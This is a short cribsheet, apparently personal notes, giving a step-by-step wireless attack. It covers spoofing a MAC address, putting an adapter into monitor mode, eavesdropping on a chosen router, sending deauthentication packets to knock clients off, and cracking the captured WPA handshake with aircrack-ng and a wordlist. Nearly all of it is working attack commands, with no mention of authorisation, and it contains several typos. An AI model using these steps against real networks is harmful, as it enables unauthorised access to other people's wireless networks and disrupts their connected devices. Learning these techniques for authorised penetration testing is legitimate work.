# Cribsheet

## Brute force dictionary attack on a wireless network

### Requirements
Kali linux installation
Wireless adapter that can enter monitor mode
Wordlist

### Checking to see if a wireless card can entire monitor mode
In general most wifi cards can enter monitor mode. Monitor mode is when you change the behavoir of the wifi card to listen to all packets not just the ones directed to your machine.

## Steps
1) Setting wifi card to monitor mode...
  1a) ifconfig wlan0 down: This turns of the wireless card ( we want to change our own mac address )
  1b) use macchanger to change to a different mac address
  1c) ifconfig wlan0 up: Turns the wireless card back on
2) airmon-ng: airmon-ng is a tool in aircrack ng that is designed for wifi network security. Airmon ng is used to activate monitor mode on our device
  2a) airmon-ng start wlan0

3) We want to get a wi-fi packet for us to attack. This is important since attacking the actual router with a dictionary attack is slow and time consuming. instead we will copy the handshake and attack the packet that we recieved
  3a) airodump0ng wlan0mon: This will give us the mac address of the router we want to attack
  3b) airodump-ng -c [] --bssid[]: this will allow us to eavsedrop on the network
  3c) aireplay-ng -0 [number-of-packages] -a [BSSID] [] This will send deauthincation packets to a machine connected to the network and allow use to look capture the packet when the device reconnects

4) cracking the packet
  aircrack-ng -a2 -b [BSSID] -w [POSSIBLE_PASSWORDS_FILE.TXT] [PATH_TO_WPA_HANDSHAKE_FILES*.cap]
  
